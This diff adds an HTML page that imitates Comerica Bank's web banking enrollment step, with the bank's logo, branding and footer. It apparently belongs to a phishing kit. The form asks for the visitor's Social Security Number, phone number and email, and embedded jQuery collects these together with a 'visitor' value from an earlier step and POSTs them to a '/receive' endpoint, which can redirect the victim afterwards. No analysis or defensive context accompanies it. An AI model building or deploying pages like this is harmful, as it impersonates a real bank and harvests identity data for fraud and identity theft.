@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!--meta name="viewport" content="width=device-width, initial-scale=1.0"-->
+    <title>Comerica Web Banking</title>
+    <link rel="stylesheet" href="/css/enroll.css">
+</head>
+<body>
+    <header>
+        <img src="/images/logo-comerica.png" alt="Comerica Bank Logo" class="logo">
+        	<hr>
+        <h1>Comerica Web Banking</h1>
+    </header>
+
+    <nav>
+        <ul class="steps">
+            <li >Step 1</li>
+            <li>Step 2</li>
+            <li class="active">Step 3</li>
+        </ul>
+    </nav>
+
+    <div id"main-container">
+    <section>
+        <h2>Confirm your information</h2>
+        <p>Fields marked with an <span class="required">*&nbsp&nbsp</span> are required.</p>
+
+        <form>
+    <!-- Existing Fields -->
+
+    <!-- SSN Section -->
+    <div class="form-group">
+        <label for="ssn">Step 1 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="ssn" name="ssn" placeholder="Enter your Social Security Number" required>
+        <span>&nbsp&nbspSocial Security Number (SSN)</span>
+    </div>
+
+    <!-- Phone Section -->
+    <div class="form-group">
+        <label for="phone">Step 2 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+        <span>&nbsp&nbspPhone Number</span>
+    </div>
+
+    <!-- Email Section -->
+    <div class="form-group">
+        <label for="email">Step 3 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+        <span>&nbsp&nbspEmail Address</span>
+    </div>
+    
+
+    <!-- Submit Section -->
+    <div class="form-actions">
+        <button type="button" class="cancel">Cancel</button>
+        <button type="submit" class="continue">Continue</button>
+    </div>
+</form>
+    </section>
+    </div>
+
+    <footer>
+    <div class="footer-container">
+        <div class="footer-nav">
+            <ul>
+                <li><a href="#">LEARN MORE ABOUT MOBILE BANKING</a></li>
+            </ul>
+            <ul>
+                <li><a href="#">TERMS OF USE</a></li>
+                <li><a href="#">PRIVACY & SECURITY</a></li> 
+            </ul>
+            <ul>
+                <li><a href="#">CONSUMER COMPLAINT NOTICE</a></li>
+                <li><a href="#">SECURITY PROTECTION</a></li>
+                <li><a href="#">LOCATIONS</a></li>
+            </ul>
+            <ul>
+                <li>COMERICA.COM</li>
+                <li>HELP</li>
+                <li>CONTACT US</li>
+                
+            </ul>
+            <!--ul>
+                <li>© 2024, Comerica Incorporated. All rights reserved. Comerica Bank. Member FDIC. </li>
+                <li>Equal Housing Lender.</li>   
+            </ul-->
+        </div>
+        <div class="footer-bottom">
+            <p>Do Not Sell or Share My Personal Information (CA Residents only)</p>
+            <p>&copy; 2024, Comerica Bank. All rights reserved.</p>
+            <p class="raise-expectations">raise your expectations</p>
+        </div>
+    </div>
+</footer>  
+</body>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+<script>
+	
+	$(document).ready(function () {
+    $('.continue').click(function (e) {
+        e.preventDefault();
+
+        let userinfo = {}; 
+        let visitor = $('#username').val();
+        sessionStorage.setItem('visitor', visitor);
+        
+        $('form input').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            
+            if (inputName) {
+                userinfo[inputName] = inputValue;
+            }
+        });
+
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
+        $.ajax({
+            url: '/receive',
+            type: 'POST',
+            data: userinfo,
+            success: function (response) {
+             if(response.url){
+                window.location.href = response.url;
+                }
+            },
+            error: function (xhr, status, error) {
+                alert('An error occurred: ' + error);
+            }
+        });
+    });
+});
+  </script>
+</html>
